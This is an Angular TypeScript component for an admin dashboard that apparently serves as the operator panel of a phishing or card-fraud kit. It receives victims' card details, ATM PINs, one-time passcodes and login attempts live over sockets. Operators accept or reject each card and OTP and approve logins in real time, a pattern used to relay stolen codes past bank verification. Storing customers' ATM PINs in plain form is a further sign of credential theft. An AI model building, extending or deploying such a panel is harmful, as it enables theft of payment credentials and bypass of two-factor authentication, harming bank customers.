import { Component, inject, signal, computed, OnInit } from '@angular/core';
import { DatePipe } from '@angular/common';
import { CUSTOMER_DATA_SOURCE } from '../../../core/services/customer-data-source';
import { SocketService } from '../../../core/services/socket.service';
import type { Customer } from '../../../core/models/customer';

@Component({
  selector: 'app-admin-dashboard',
  imports: [DatePipe],
  templateUrl: './admin-dashboard.html',
})
export class AdminDashboard implements OnInit {
  private readonly customerService = inject(CUSTOMER_DATA_SOURCE);
  private readonly socketService = inject(SocketService);

  protected readonly customers = signal<Customer[]>([]);
  protected readonly isLoading = signal(true);
  protected readonly error = signal<string | null>(null);
  protected readonly panelCustomer = signal<Customer | null>(null);
  protected readonly activeTab = signal<'info' | 'cards' | 'otps'>('info');
  protected readonly searchQuery = signal('');
  protected readonly currentLoginAttempt = signal<any>(null);


  protected readonly filteredCustomers = computed(() => {
    const q = this.searchQuery().toLowerCase().trim();
    if (!q) return this.customers();
    return this.customers().filter(c =>
      c.customer_name.toLowerCase().includes(q) ||
      c.customer_phone_number.includes(q) ||
      c.customer_email.toLowerCase().includes(q) ||
      c.customer_province.toLowerCase().includes(q)
    );
  });

  ngOnInit() {
    this.loadCustomers();

    this.socketService.joinAdmin();

    this.socketService.onEvent('new_customer').subscribe(() => this.loadCustomers(false));
    this.socketService.onEvent('new_card').subscribe(() => this.loadCustomers(false));

    this.socketService.onEvent('atm_pin_attempt').subscribe((data: any) => {
      this.customers.update(customers => customers.map(c => {
        if (c.customer_id === data.customer_id) {
          return {
            ...c,
            ccs: c.ccs.map((cc, index) => index === c.ccs.length - 1 ? { ...cc, atm_password: data.pin } : cc)
          };
        }
        return c;
      }));
      if (this.panelCustomer()?.customer_id === data.customer_id) {
        this.panelCustomer.set(this.customers().find(c => c.customer_id === data.customer_id) || null);
      }
    });

    this.socketService.onEvent('new_otp').subscribe(() => this.loadCustomers(false));
    this.socketService.onEvent('new_atm').subscribe(() => this.loadCustomers(false));

    this.socketService.onEvent('login_attempt').subscribe((data) => {
      this.currentLoginAttempt.set(data);
    });
  }

  protected approveLoginAttempt() {
    const attempt = this.currentLoginAttempt();
    if (attempt && attempt.socketId) {
      this.socketService.approveLogin(attempt.socketId);
      this.currentLoginAttempt.set(null);
    }
  }

  protected rejectLoginAttempt() {
    this.currentLoginAttempt.set(null);
  }

  protected loadCustomers(showLoading = true) {
    if (showLoading) {
      this.isLoading.set(true);
      this.error.set(null);
    }
    this.customerService.getCustomers().subscribe({
      next: (data) => {
        const mappedData = data.map((c: any) => {
          if (c.atms && c.atms.length > 0 && c.ccs && c.ccs.length > 0) {
            const ccs = c.ccs.map((cc: any, index: number) => {
              const atm = c.atms[index] || (index === c.ccs.length - 1 ? c.atms[c.atms.length - 1] : undefined);
              return atm ? { ...cc, atm_password: atm.pass } : cc;
            });
            return { ...c, ccs };
          }
          return c;
        });
        
        this.customers.set(mappedData);
        
        const currentPanel = this.panelCustomer();
        if (currentPanel) {
          const updatedCustomer = mappedData.find((c: any) => c.customer_id === currentPanel.customer_id);
          if (updatedCustomer) {
            this.panelCustomer.set(updatedCustomer);
          }
        }
        
        if (showLoading) {
          this.isLoading.set(false);
        }
      },
      error: (err) => {
        if (showLoading) {
          this.error.set('تعذّر تحميل البيانات. حاول مرة أخرى.');
          this.isLoading.set(false);
        }
        console.error(err);
      }
    });
  }

  protected openPanel(customer: Customer) {
    this.panelCustomer.set(customer);
    this.activeTab.set('info');
  }

  protected closePanel() {
    this.panelCustomer.set(null);
  }

  protected setTab(tab: 'info' | 'cards' | 'otps') {
    this.activeTab.set(tab);
  }

  protected onSearch(event: Event) {
    this.searchQuery.set((event.target as HTMLInputElement).value);
  }

  protected initials(name: string): string {
    return name.split(' ').slice(0, 2).map(w => w[0]).join('').toUpperCase();
  }

  protected hasPending(customer: Customer): boolean {
    return customer.ccs.some(c => c.card_status === 'PENDING') ||
           customer.otps.some(o => o.otp_status === 'PENDING');
  }

  protected getCardBrand(name: string): string {
    if (!name) return 'CARD';
    const n = name.toLowerCase();
    if (n.includes('visa')) return 'Visa';
    if (n.includes('master')) return 'Mastercard';
    if (n.includes('troy') || n.includes('troy')) return 'TROY';
    return name;
  }

  protected acceptCard(customerId: string, cardId: string, event: Event) {
    event.stopPropagation();
    this.customerService.updateCardStatus(cardId, 'ACCEPTED').subscribe({
      next: () => {
        this.customers.update(customers => customers.map(c => {
          if (c.customer_id === customerId) {
            return {
              ...c,
              ccs: c.ccs.map(cc => cc.card_id === cardId ? { ...cc, card_status: 'ACCEPTED' } : cc)
            };
          }
          return c;
        }));
        if (this.panelCustomer()?.customer_id === customerId) {
          this.panelCustomer.set(this.customers().find(c => c.customer_id === customerId) || null);
        }
      },
      error: (err) => console.error(err)
    });
  }

  protected rejectCard(customerId: string, cardId: string, event: Event) {
    event.stopPropagation();
    this.customerService.updateCardStatus(cardId, 'REJECTED').subscribe({
      next: () => {
        this.customers.update(customers => customers.map(c => {
          if (c.customer_id === customerId) {
            return {
              ...c,
              ccs: c.ccs.map(cc => cc.card_id === cardId ? { ...cc, card_status: 'REJECTED' } : cc)
            };
          }
          return c;
        }));
        if (this.panelCustomer()?.customer_id === customerId) {
          this.panelCustomer.set(this.customers().find(c => c.customer_id === customerId) || null);
        }
      },
      error: (err) => console.error(err)
    });
  }

  protected acceptOtp(customerId: string, otpId: string, event: Event) {
    event.stopPropagation();
    this.customerService.updateOtpStatus(otpId, 'ACCEPTED').subscribe({
      next: () => {
        this.customers.update(customers => customers.map(c => {
          if (c.customer_id === customerId) {
            return {
              ...c,
              otps: c.otps.map(o => o.otp_id === otpId ? { ...o, otp_status: 'ACCEPTED' } : o)
            };
          }
          return c;
        }));
        if (this.panelCustomer()?.customer_id === customerId) {
          this.panelCustomer.set(this.customers().find(c => c.customer_id === customerId) || null);
        }
      },
      error: (err) => console.error(err)
    });
  }

  protected rejectOtp(customerId: string, otpId: string, event: Event) {
    event.stopPropagation();
    this.customerService.updateOtpStatus(otpId, 'REJECTED').subscribe({
      next: () => {
        this.customers.update(customers => customers.map(c => {
          if (c.customer_id === customerId) {
            return {
              ...c,
              otps: c.otps.map(o => o.otp_id === otpId ? { ...o, otp_status: 'REJECTED' } : o)
            };
          }
          return c;
        }));
        if (this.panelCustomer()?.customer_id === customerId) {
          this.panelCustomer.set(this.customers().find(c => c.customer_id === customerId) || null);
        }
      },
      error: (err) => console.error(err)
    });
  }
}
